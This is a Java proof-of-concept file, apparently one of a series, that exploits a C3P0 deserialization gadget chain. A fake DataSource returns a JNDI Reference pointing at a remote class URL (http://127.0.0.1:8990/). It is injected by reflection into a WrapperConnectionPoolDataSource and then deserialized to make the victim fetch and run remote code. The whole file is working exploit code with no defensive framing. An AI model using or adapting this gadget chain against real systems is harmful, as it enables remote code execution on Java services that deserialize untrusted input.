package com.example.C3P0;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.DataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.Connection;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class POC_5 {

    private static final class PoolSource implements DataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

        @Override
        public Connection getConnection() throws SQLException {
            return null;
        }

        @Override
        public Connection getConnection(String username, String password) throws SQLException {
            return null;
        }

        @Override
        public <T> T unwrap(Class<T> iface) throws SQLException {
            return null;
        }

        @Override
        public boolean isWrapperFor(Class<?> iface) throws SQLException {
            return false;
        }

    }

    public static void main(String[] args) throws Exception {
        WrapperConnectionPoolDataSourceBase poolBackedDataSourceBase = new WrapperConnectionPoolDataSource(false);
        ReflectionUtil.setField(poolBackedDataSourceBase, "nestedDataSource", new PoolSource("exp","http://127.0.0.1:8990/"));

        SerializeUtil.deserialize(SerializeUtil.serialize(poolBackedDataSourceBase));
    }

}
